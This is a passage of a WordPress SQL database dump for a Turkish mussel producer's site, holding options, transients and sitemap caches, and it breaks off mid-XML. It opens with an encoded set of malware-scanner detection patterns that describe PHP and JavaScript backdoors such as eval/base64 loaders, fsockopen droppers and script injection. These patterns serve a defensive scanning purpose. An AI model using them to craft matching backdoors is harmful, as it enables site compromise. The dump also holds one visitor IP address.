6e2k6MDtzOjU6IkY5TUhtIjtpOjE7czoxNzc6Ii8oKDxcIS=tfFwvXCopdmlzaXRvclRyYWNrZXIoXCpcL3wtLT4pKVxzKig8XD9bcGhcc1=rLis_YmFzZTY=X2RlY29kZVxzKlwoLis_XD8-fC4rP2RvY3VtZW5=XC5jcmVhdGVFbGVtZW5=XChbJyJdc2NyaXB=WyInXVwpO1xzKlthLXpfMC=5XStcLnNyY1xzKj1bXHMnIl=raHR=cFw6XC9cLy4rPylccypcMS9pcyI7fXM6NTg6ImZzb2Nrb3BlbiBmd3JpdGUgd2hpbGUgZmVvZiBmY2xvc2UgcHJlZ19tYXRjaCBnenVuY29tcHJlc3MiO2E6Mjp7aTowO3M6NToiRkE1TE8iO2k6MTtzOjIzMjoiLyhcJFthLXpfMC=5XSspXHMqPVxzKlxAP2Zzb2Nrb3BlblwoW147XSs7XHMqaWZbXChcc1=rXDFbXClcc1=qXHsuKz9md3JpdGVcKFwxW147XSs7XHMqd2hpbGVbXHNcKFwhXStmZW9mXChcMS4rP2ZjbG9zZVwoXDFcKTtccypwcmVnX21hdGNoXChbXixdKyxbXixdKyxccyooXCRbYS16XzAtOV=rKVwpO1xzKmlmW1woXHNdK1wyXFsxXF1bXHNcIV=qPS4rP2d6dW5jb21wcmVzc1woW147XSs7W1x9XHNdKy9pcyI7fXM6MjA6IlRhZ2dlZCBldmFsIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkczVDlBIjtpOjE7czoxMjU6Ii8oXC9cKlteXCpdK1wqXC8pXHMqKFtcc2Etel8wLTlcPV=rKSpbO1xzXChdKih3aW5kb3dbXC5cWyInXStcXHhbXjtdK3xmdW5jdGlvblwoXCkuKyk7XHMqZXZhbFtcKFxzXStbXlwpXStbJyJcc1woXCk7XH1dK1wxL2lzIjt9czo=NDoic2NyaXB=IHZhciBodHRwIGlmIGRvY3VtZW5=IHdyaXRlIHNjcmlwdCBzcmMiO2E6Mjp7aTowO3M6NToiRzJDSXciO2k6MTtzOjM1MjoiLyg8c2NyaXB=W14-XSo-XHMqKCh2YXJccyopP1thLXpfMC=5XStccyo9WyciO1xzXSooc2V=VGltZW91dHxlbmNvZGVVUklDb21wb25lbnQpXChbXlwpXSpbJyJcKTtcc117Mix9KSsoW3ZhclxzXSooW2Etel8wLTldKylccyo9XHMqWyciXVtoZnRdK3RwW3NdKjpcL1wvW147XSs7XHMqKCh2YXJccyopPyhbYS16XzAtOV=rKVxzKj1ccypcNlteO1=rO1xzKikrKT9pZlteXHtdK1x7XHMqZG9jdW1lbnRcLndyaXRlXChbIiddPFtzY3JpcHRccyciXCtdezcsfVteXH1dKnNyYz1bJyJcc1wrXSsoXDl8W2ZodF=rdHBbc1=qOlwvXC8uK2pxdWVyeVwuKG1pblwuKSpwaHApKFteO1=rW1x9O1xzXSspKz88XC9zY3JpcHQ-KSsvaSI7fXM6NDU6ImZ1bmN=aW9uIHVuc2V=IHdwX2xpc3RfdGFibGUgaXRlbXMgYWRkX2FjdGlvbiI7YToyOntpOjA7czo1OiJHQUdFRyI7aToxO3M6NDQzOiIvKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKihcJFteO1=rPVteO1=rO1xzKikqKGlmW1woXHNcIV=rZnVuY3Rpb25fZXhpc3RzW1woXHMnIl=raW5pX3NldFsnIlwpXHtcc1=rKFxAP2luaV9zZXRcKFteO1=rWztcc1=rKStbXHNcfTtdKykqZnVuY3Rpb25ccysoW2Etel8wLTldKylccypcKFteXH1dKyhwYWNrXChbJyJdSFwqWyciLFxzXC4wLTlBLUZcKV=rO1xzKmlmW1xzXChcQGlzX1=rZmlsZVtfYS16XSpbXChcc1=rKFwkW2Etel8wLTldKykuKz9maWxlX2dldF9jb25=ZW5=c1tcc1woXStcOC4rP2ZpbGVfcHV=X2NvbnRlbnRzW1xzXChdK1w4fHVuc2V=XChcJHdwX2xpc3RfdGFibGUtPml=ZW1zXFt8ZmlsZV9nZXRfY29udGVudHNcKF9fRklMRV9fLis_ZnB1dHNcKC4rP3NjYW5kaXJcKCkuKz9hZGRfYWN=aW9uXChbXixdK1ssXHMwLTlcKSciXStcNlteO1=rOy9pcyI7fXM6Mzk6InBocCBlcnJvcl9yZXBvcnRpbmcgZnVuY3Rpb24gZGV=ZWN=X2NtcyI7YToyOntpOjA7czo1OiJGQkJHMCI7aToxO3M6MTYwOiIvPFw_W3BoXHNdKyhcQD8oZXJyb3JfcmVwb3J=aW5nfHNldF9=aW1lX2xpbWl=fGluaV9zZXQpXCguKj8wXCk7XHMqKSsuKj9mdW5jdGlvbiAoZGV=ZWN=X2Ntc1woKS4rXDNbXjtdKztccyooKGlmXHMqXChbXlwpXSt8ZWxzZSlbXlx7XSpbXlx9XStbXH1cc1=rKSsoJHxcPz4pL2lzIjt9czo1MToiZnVuY3Rpb24gZ2x1ZXNfaXQgc2FuaXRpemVfa2V5IGNhbGxfdXNlcl9mdW5jX2FycmF5IjthOjI6e2k6MDtzOjU6IkZCSTlLIjtpOjE7czoyOTI6Ii8oaWZbXHNcKFwhXStmdW5jdGlvbl9leGlzdHNcKFxzKlsnIl1bYS16XzAtOV=rWyciXVtcc1wpXStce1xzKik_ZnVuY3Rpb25ccysoW2Etel8wLTldKylccypcKFteXCldK1tcKVxzXStce1xzKihcJFthLXpfMC=5XSspXHMqPVxzKnNhbml=aXplX2tleVwoW147XSs7XHMqKFwkW2Etel8wLTldKylccyo9XHMqY2FsbF91c2VyX2Z1bmNfYXJyYXlcKFxzKlwzW147XSs7XHMqcmV=dXJuXHMqXDQuK1wyXHMqXChbXjtdKztccyouK2NhbGxfdXNlcl9mdW5jX2FycmF5XChbXjtdKztbXH1cc1=rKCR8KD89XD8-KSkvaXMiO31zOjE2OiJwaHAgZXZhbCBWYXIgSGV4IjthOjI6e2k6MDtzOjU6IkZCS=tSIjtpOjE7czoxMTU6Ii88XD9bcGhcc1=rKEA_ZXZhbFxzKlwoXHMqKSsoWyciXSlbXHNcXF=qXCRbYS16XF8wLTlcW1xdXHtcfVxzJyJdKz1bXHNcXCciXSooXFx4WzAtOV17Mn=pKy4rXDIoXHMqXCkpKztccyooJHxcPz4pL2kiO31zOjI5OiJpZiBzdHJwb3MgUkVRVUVTVF9VUkkgaW5jbHVkZSI7YToyOntpOjA7czo1OiJGQ1FGUyI7aToxO3M6MTQ5OiIvaWYoW1xzXChdK3N=clthLXpfMC=5XSspezIsfVtcc1woXStcJF9TRVJWRVJcW1siJ11SRVFVRVNUX1VSSVsnIl1cXVxzKlwpK1teXCldK1tcKVxzXStce1tcc1xAXSooaW5jbHVkZXxyZXF1aXJlKShfb25jZSk_W147XStbO1xzXSsoZXhpdFtccztdKyk_XH=vaSI7fXM6NzY6ImVycm9yX3JlcG9ydGluZyBpbmlfc2V=IHNldF9=aW1lX2xpbWl=IGlnbm9yZV91c2VyX2Fib3J=IGVsc2VpZiByZXF1aXJlX29uY2UiO2E6Mjp7aTowO3M6NToiRkNVTGQiO2k6MTtzOjIxOToiLzxcP1twaFxzXSsoXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSooKGVycm9yX3JlcG9ydGluZ3xpbmlfc2V=fHNldF9=aW1lX2xpbWl=fGlnbm9yZV91c2VyX2Fib3J=KVxzKlwoW147XStbO1xzXSspezUsfSgoZWxzZVxzKnxpZlxzKlwoK1teXCldK1tcc1wpXSspK1xAPyhyZXF1aXJlfGluY2x1ZGUpKF9vbmNlKT9bXjtdK1s7XHNdKykrKCR8XD8-KS9pIjt9czo4MzoicGhwIGlmIGZ1bmN=aW9uX2V4aXN=cyBmdW5jdGlvbiBjdXJsX2luaXQgcmV=dXJuIGZ1bmN=aW9uIHRyaW=gcmV=dXJuIGJhc2U2NF9kZWNvZGUiO2E6Mjp7aTowO3M6NToiRzE4Rm4iO2k6MTtzOjQwNToiLzxcP1twaFxzXSsoXCRbYS16XzAtOV=rKVxzKj1bXjtdKztccyppZlxzKlwoXHMqXCFmdW5jdGlvbl9leGlzdHNcKFsiJ1=oW2Etel8wLTldKylbJyJdXClbXClcc1x7XSpmdW5jdGlvblxzKlwyXChbXlwpXStcKVtcKVxzXHtdK1teXG5dKmN1cmxfaW5pdFwoXCk7Lis_cmV=dXJuW147XSs7W1xzK1x9XStpZlxzKlwoXHMqXCFmdW5jdGlvbl9leGlzdHNcKFsiJ1=oW2Etel8wLTldKylbJyJdXClbXClcc1x7XSpmdW5jdGlvblxzKlwzXChbXlwpXStcKVtcKVxzXHtdK1teXG5dKnRyaW1bXjtdKzsuKj9yZXR1cm5bXjtdKztbXHMrXH1dKyguKj8oYmFzZTY=X2RlY29kZVtcKFxzXStcMXxcMlwofFwzXCgpW15cKV=qW1wpXHNdK1teO1=qWztcc1=rKXszLH=oKGVjaG98cHJpbnQpW147XSs7XHMqKSsoJHxcPz4pL2lzIjt9czoxMjoiUEhQIHJldmVyc2VkIjthOjI6e2k6MDtzOjU6IkcyOEFyIjtpOjE7czo=MToiL14oXHMqXD5cP1xzKik_Oy4rXCQoW3BoXHNdKlw_XDxccyopPyQvaXMiO319czo4OiJ=aW1=aHVtYiI7YToxOntzOjI5OiJvdXRkYXRlZCB2ZXJzaW9ucyBvZiBUaW1UaHVtYiI7YToyOntpOjA7czo1OiJIMVFKRSI7aToxO3M6NjA6Ii8uK1RpbVRodW1iLitkZWZpbmVccypcKFtccyciXStWRVJTSU9OW1xzJyJdKyxbXHMnIl=rMVwuLisvcyI7fX1zOjk6IndoaXRlbGlzdCI7YToyOntzOjM6InBocCI7YToyODp7aTowO3M6NToiRkE4SGQiO3M6Mzg6IjU4NzNjZDFjZWE2MTA4MjAyZDIxMzQ3ZjAxZjA=ZGNmTzgxNzI4IjtzOjU6IkQ3NTlwIjtzOjM5OiIwMTM2MzcyOGM4NDNmZjkzZTk2YjY5ODNjZTM4ZWJhNk8xOTU2MTgiO3M6NToiRDVBODMiO3M6Mzg6ImQ1ZjNjOWNhZmYxNGQ1N2M4NjA4ZDc4ZGIwMDk=YmUwTzczNjQzIjtzOjU6IkQ3NUQ5IjtzOjM4OiI1N2FmNDk4MThiYmI5NDlkYzBhYzYzODY3Mzg2NTViYk8yNTg1MiI7czo1OiJEN=pEOSI7czozODoiZDQ5NDA=MjYwZDc5YTRjYzM3NTVjMDBmNTVkZTIwODlPMjU2NjIiO3M6NToiRDhWOEEiO3M6Mzc6Ijg2NjFmZTJiZmE1OTk1ZjU=NmEzMzA=N2U5MDM4NTZjTzExMzYiO3M6NToiRElDRkMiO3M6Mzg6IjgxMjVkNDJjNGJlNTQzZjg3NGVhNWY2YTFiNWJkZTU1TzI1ODk=IjtzOjU6IkRJQ=ZEIjtzOjM5OiJlZGRiNWZkYTc=ZDQxZGJkYWMwMTgxNjc1MzZkOGQ1M=8yMzEzMzgiO3M6NToiRElDRkUiO3M6Mzg6ImMxNWE=ZDVjMzgzNDQ=Yjk1ZDI4NTU5ZjgzNDgxMTFkTzIyNTg4IjtzOjU6IkUxUjJ2IjtzOjM4OiJlMjA4MzljNTU5YTY2YzdjZjYyODY1M2JhMjQ4NGVhZU8yNjM5NSI7czo1OiJFMVIyeCI7czozODoiZjMzODJlYzE1YzAzMGJkMzJlMjkzZmFmMzQ5N2UyNTNPMTEyMjYiO3M6NToiRTIzMEMiO3M6Mzc6IjI4YTkyZjQ2NDk4ZDMyYjlhNzRjNTg=N2Y3NWM5MTJlTzczOTkiO3M6NToiRTIzMEMiO3M6Mzc6ImYwMGFhZjAxZmYwMmQ1NzU2YzI2N2JjZjkyMGU=YzI4TzE1NDAiO3M6NToiRTJBTWYiO3M6Mzg6IjU3YzY=N2Q5M2ZiZDQ3ODY4Yjg3YjkyMWJlZTYzYWY4TzI2Mzc2IjtzOjU6IkU1RURvIjtzOjM5OiI4ZTJhZjQ4ODZkYzgxYTVkOTI4OTg2NWJiYjgxM2VkMU8xOTU2MTciO3M6NToiRTVJTlAiO3M6Mzc6ImY4MGQ5ZWY=YjdiZmQ5ZWY1NDJkOTA4N2ExZGIyYWU5TzIwMTAiO3M6NToiRTdFTXYiO3M6Mzg6IjVmOTI3ZjNhOTczMjE4ZDA3ZTQzZWExYzY5ZmMwMzMxTzI2Nzc2IjtzOjU6IkVBNjZsIjtzOjM4OiJhNWIxYTczZTBjNDI5ODk1MDc1MGE4YmNkOTYyN2VhZk8yNjgxMSI7czo1OiJFQ=NFMCI7czozNzoiNjQ5NDRlMjI1MTEzYmUxODM5NGQ1YmMwMWZiM2I1MzdPNzUzMCI7czo1OiJFQ=NFMyI7czozODoiOTdlNDM4ZDZjOWM2NGEyMDJiOTMwNzg2ZDI3NjIwNWJPNjI=NTgiO3M6NToiRUNDRTMiO3M6Mzg6IjY3ZWMxYjE1M2NjM2YzZTM2ZmJlZTU5MDI5YTkzZDRhTzI1OTE=IjtzOjU6IkVDSktGIjtzOjM3OiI4MzY2NTdkYmE1Y2IyMjkwMDAwMjQ=Nzc2NjBlOWRkZk84MzY5IjtzOjU6IkY=MzczIjtzOjM4OiJmNjAwNzlmZWMwZTVkNGQ2N2U=OWFkYTMzNmRhYWY5Mk8yNjgxMCI7czo1OiJGNDM3NCI7czozOToiMDNiMjFmZmM5Yzc5Y2ZiNjI=NzkwYjBiYTQ4NDY5MWNPMzIwMzMyIjtzOjU6IkY1TE1iIjtzOjM4OiI1ZTY4NTVjZjAyYzRhYTBhY2M4NzAwZjdmNjEzZGYwME82MDE2MyI7czo1OiJGNkZKZSI7czozNzoiNzFjZDE2NDgwYWRkMjBmNTE2ZjQxY2YwNDU3NWZiMThPMTg4NCI7czo1OiJGOUE5dCI7czozOToiODM=ZDIyZjhiNjhhMmM1YzAxODY2YTQzZWIyNGVmYzRPMTk1NzAyIjtzOjU6IkZBOEhkIjt9czoyOiJqcyI7YTozNDp7aTowO3M6NToiRjlBQUIiO3M6Mzc6IjU1NGJjNzZjNzAzNTExODdmNGNlMDVkZGMwMTJhYWVkTzQ3NzYiO3M6NToiRDY2N1giO3M6Mzc6IjlhOWMxMjU4MTRiOTcxNTk4MmQyNDZhMWVlNzgwODRmTzUzNDUiO3M6NToiRDY2N1giO3M6Mzg6ImUzNmEwODYxMjM3NTY=MTIyOTMyMzFhZWFkMTdmMjRmTzM3NjI5IjtzOjU6IkQ3NUFIIjtzOjM3OiJhMzhhYzUyNjY5MjQ5MzhhNGZmNTUxNDM2OWM2YjQwZE8=Njc=IjtzOjU6IkQ3NUFKIjtzOjM3OiIxMDQzYTFkN2Q4NGVlNTZmODgzMWE2MGNkZmM1ZGMyOE83MDc3IjtzOjU6IkQ3NURTIjtzOjM4OiI2ZWMxNTBiNzk4N2NhYWVmOThiNTljODdiOWY=NzFiZU8xMTg=MiI7czo1OiJFMVIybiI7czozODoiNjE=N2NjZWU3YWVmOWRjMGM2ZWIxMGQ4ZDdiMzExZjlPNzA4ODMiO3M6NToiRTFSMnciO3M6Mzc6ImJhMzI5Mzk3MGUxM2IwM2EyZWE5MmY1YjZiNWJmNTQ=TzMzNzciO3M6NToiRTIyTnEiO3M6Mzc6IjYzYjBhZWQ5YjAyZjg3OWE2ZTAyOTVmYmVhN2RiODU=TzQ3MDIiO3M6NToiRTIzMEQiO3M6Mzc6ImVmNDE4OGNiMGI2MGE3MjAxN2Y=YzhhMWU4NDBhYjFlTzI5NTAiO3M6NToiRTI=OUwiO3M6Mzc6ImZiOGJmNjc4NWU1NWU5ZTM5YmVhNTUyNjM1YzQyYTY=TzMyNzAiO3M6NToiRTI2MEMiO3M6Mzk6ImFjYjMzMzI5YjllZjhhYWJkOGJkNzMxNDI2ODAzZTRlTzIzMjQ4MiI7czo1OiJFMjYwRSI7czozODoiNmNlYjY=NzU5MjU4OGJjZjQ2M2JlZmQ5NDA4ZTI3YWRPMTIwMjUiO3M6NToiRTI2MEgiO3M6Mzc6IjVhMzE4Mjc3ZmVkZjQ5MWEwMzAxZTE3N2E5ZWYxMGIzTzQ5MDgiO3M6NToiRTI2MEoiO3M6Mzg6ImRiYzM4MDg=NzNkZWYwMGZjZTQ1ZmU1NjRkYzcyZGNiTzE=NzIwIjtzOjU6IkUyNjBLIjtzOjM3OiJiOTg5YTViZDg=ZjZlYmNiYzEzOTNlYzAwM2U2ZTk5MU8=OTY5IjtzOjU6IkUyN=VHIjtzOjM4OiIwMzBiODM4OTM3NmE=MmZmM2RhMTg2YmY2NTgwNjIxN=8xNjUzMSI7czo1OiJFMjlEMiI7czozNzoiZGVmMjU3ZGJiMGFiODA1YzQ5OTZmZDhhYmIxYTZiNDlPNjcxNyI7czo1OiJFMkg1biI7czozODoiNzRkOTAzMDQ5NjgzZTViYmVhOWNjYjc1NDRhNDJiY2FPMTc=MTMiO3M6NToiRTVFRHEiO3M6Mzg6IjYwM2JkMTQyOTlmNjFhNzMyOWIyZDM1M2IyYjU2YzJmTzM3Njg5IjtzOjU6IkU1RURwIjtzOjM3OiIwNDI2YjM5NzU=YWE2YmM3NjZkODllYTRjNDFiYmQwNk8zNDU3IjtzOjU6IkU1RUR4IjtzOjM4OiJlYWRjNTgzMjUxM2Q1NjcwODg=YTk3NWM2ZGUxMGYwMU8xOTYxNSI7czo1OiJFN1VNQSI7czozODoiMzhkYmNjOTI1NTI5MzY4ODEyZjVjMmZiY2IzODk2MTZPMTQ5NjUiO3M6NToiRTdVTUIiO3M6Mzc6ImExYzE4MjI3ZTZlOTM3OThjNDkzYWVkOTZlZTZjYzg=TzMyNjciO3M6NToiRTdVTUIiO3M6Mzc6IjA3ODM4OGE2NDMxYWE1YjA4MzhhODczMmQxODdmZTI5Tzg5MTMiO3M6NToiRThBQXAiO3M6Mzc6ImYzYjFiMjg=MjQzNmY3YTMxMWIzOWU=ZWY=YjQ3ZjU5TzQzNTIiO3M6NToiRThCQlUiO3M6Mzc6ImQ3MDk=MDYxOWE5OWQ1NTUxMTYxNjdkNGZiMzljYTE1TzQzOTciO3M6NToiRTlDTHgiO3M6Mzg6ImNiZGJmYzkxODRkMjhhYzU1ZjgzYzBiMGRmNDBmZDQzTzc5NDE=IjtzOjU6IkU5RzhqIjtzOjM4OiJlZjNhZTkwMTQ1MjVjZjgxMTg3YWZhYTYxYmNhNzM3ZU8zNzY5MSI7czo1OiJFQ=NFMSI7czozODoiZjQ=OGM1OTNjMjQyZDEzNGU5NzMzYTg=YzdhNGQyNmNPMTUyNDgiO3M6NToiRUNIOVgiO3M6Mzk6IjUxYmJhMGQ1MzMzZGU=ZmRhMDk1NGY1MWVhMzU1YTUwTzEwNjc5NyI7czo1OiJGMkE4VSI7czozODoiNjkyZjhlODYxYmFmYTMxZmJmMWIzODA1YjRiMGQ3ZDNPMTUwMTYiO3M6NToiRjQ2SWgiO3M6Mzg6ImQ4NDIzM2RkMjkzNzE3ZjBhMDdiNTU4YjJmZTM4ZjU2TzE1MDUzIjtzOjU6IkY5QUFCIjt9fXM6ODoid3BfbG9naW4iO2E6MTp7czozNjoiYnJ1dGUgZm9yY2UgcG9zc2libGUgb24gd3AtbG9naW4ucGhwIjthOjI6e2k6MDtzOjU6IkQ=T=FCIjtpOjE7czoxNzU6Ii8uKj9yZXF1aXJlXChbIFx=XSpkaXJuYW1lXChfX=ZJTEVfX1wpWyBcdF=qXC5bIFx=XSpbIiddXC93cFwtbG9hZFwucGhwWyInXVsgXHRdKlwpOyg_IVwvXC8yMDEzLTA=LTI=IERPIE5PVCBSRU1PVkUgVEhJUyBSRVFVSVJFRCBMSU5FKVteXG5dKihbXHJcbiBcdF=qXCRfU=VTU=lPTlxbW147XSs7KSovaXMiO319fQ3","yes");
INSERT INTO `cmrfu_options` VALUES("19430","_transient_timeout_users_online","1489227603","no");
INSERT INTO `cmrfu_options` VALUES("19431","_transient_users_online","a:1:{i:0;a:3:{s:7:\"user_id\";i:1;s:13:\"last_activity\";d:1489233003;s:10:\"ip_address\";s:12:\"95.164.1.157\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19453","_transient_timeout_yst_sm_1_1:3cCoc_35YLm","1489788039","no");
INSERT INTO `cmrfu_options` VALUES("19454","_transient_yst_sm_1_1:3cCoc_35YLm","C:24:\"WPSEO_Sitemap_Cache_Data\":1042:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:995:\"<sitemapindex xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<sitemap>
		<loc>https://www.ismido.com.tr/post-sitemap.xml</loc>
		<lastmod>2017-03-10T10:26:01+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/page-sitemap.xml</loc>
		<lastmod>2017-01-25T21:26:36+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/attachment-sitemap.xml</loc>
		<lastmod>2017-01-25T20:52:09+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/portfolio-sitemap.xml</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/category-sitemap.xml</loc>
		<lastmod>2017-03-10T10:26:01+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/portfolio_category-sitemap.xml</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.ismido.com.tr/author-sitemap.xml</loc>
		<lastmod>2017-03-10T10:25:32+02:00</lastmod>
	</sitemap>
</sitemapindex>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19538","_transient_doing_cron","1490165872.6339099407196044921875","yes");
INSERT INTO `cmrfu_options` VALUES("19456","_transient_timeout_yst_sm_portfolio_category_1:3cCoc_3ZGtD","1489893195","no");
INSERT INTO `cmrfu_options` VALUES("19457","_transient_yst_sm_portfolio_category_1:3cCoc_3ZGtD","C:24:\"WPSEO_Sitemap_Cache_Data\":610:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:563:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/portfolio_category/midye/</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio_category/urunler/</loc>
		<lastmod>2016-11-22T23:31:59+02:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("19495","_transient_timeout_yst_sm_attachment_1:3cCoc_6sCi6","1490145763","no");
INSERT INTO `cmrfu_options` VALUES("19496","_transient_yst_sm_attachment_1:3cCoc_6sCi6","C:24:\"WPSEO_Sitemap_Cache_Data\":15136:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:15087:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/kara-midye/nophoto/</loc>
		<lastmod>2014-02-19T22:17:13+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/nophoto.png</image:loc>
			<image:title><![CDATA[nophoto]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/gidasicil/</loc>
		<lastmod>2016-11-22T23:11:47+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/gidasicil.jpg</image:loc>
			<image:title><![CDATA[gidasicil]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/kara-midye/urunler_1/</loc>
		<lastmod>2016-11-22T23:17:07+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_1.jpg</image:loc>
			<image:title><![CDATA[urunler_1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/ic-midye/urunler_2/</loc>
		<lastmod>2016-11-22T23:28:28+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_2.jpg</image:loc>
			<image:title><![CDATA[urunler_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/jumbo-midye-dolma/jumbo_midye_dolma/</loc>
		<lastmod>2016-11-22T23:30:32+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/jumbo_midye_dolma.jpg</image:loc>
			<image:title><![CDATA[jumbo_midye_dolma]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/portfolio-item/maxi-midye-dolma/urunler_4/</loc>
		<lastmod>2016-11-22T23:31:52+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2013/10/urunler_4.jpg</image:loc>
			<image:title><![CDATA[urunler_4]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/kayit-belgesi-001/</loc>
		<lastmod>2017-01-08T21:04:37+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/kay%C4%B1t-belgesi-001.jpg</image:loc>
			<image:title><![CDATA[kayıt belgesi 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/marka-patent-i%cc%87smi%cc%87do-001/</loc>
		<lastmod>2017-01-08T21:04:42+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/MARKA-PATENT-I%CC%87SMI%CC%87DO-001.jpg</image:loc>
			<image:title><![CDATA[MARKA PATENT İSMİDO 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/marka-tescili/</loc>
		<lastmod>2017-01-08T21:04:47+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/marka-tescili.jpg</image:loc>
			<image:title><![CDATA[marka tescili]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/midye-tahlil-raporu/</loc>
		<lastmod>2017-01-08T21:04:50+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/midyenin-faydalari-nelerdir/</loc>
		<lastmod>2017-01-08T21:04:52+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/misya-sertifika-001/</loc>
		<lastmod>2017-01-08T21:04:54+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika-001.jpg</image:loc>
			<image:title><![CDATA[misya sertifika 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/misya-sertifika2-001/</loc>
		<lastmod>2017-01-08T21:04:58+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/misya-sertifika2-001.jpg</image:loc>
			<image:title><![CDATA[misya sertifika2 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/belgeler/onay-belgesi-001/</loc>
		<lastmod>2017-01-08T21:05:03+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2014/08/onay-belgesi-001.jpg</image:loc>
			<image:title><![CDATA[onay belgesi 001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/attachment/5/</loc>
		<lastmod>2017-01-25T20:42:40+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/5.jpg</image:loc>
			<image:title><![CDATA[5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/attachment/6/</loc>
		<lastmod>2017-01-25T20:42:51+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/6.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/9-001/</loc>
		<lastmod>2017-01-25T20:43:05+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/9-001.jpg</image:loc>
			<image:title><![CDATA[9-001]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/10-002/</loc>
		<lastmod>2017-01-25T20:43:18+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/10-002.jpg</image:loc>
			<image:title><![CDATA[10-002]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/attachment/10/</loc>
		<lastmod>2017-01-25T20:43:32+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/10.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.ismido.com.tr/uretim/15-001/</loc>
		<lastmod>2017-01-25T20:43:49+02:00</lastmod>
		<image:image>
			<image:loc>https://www.ismido.com.tr/wp-content/uploads/2017/01/15-001.jpg</image:loc>
			<image:title><![CDATA[15-001]]></image:title>
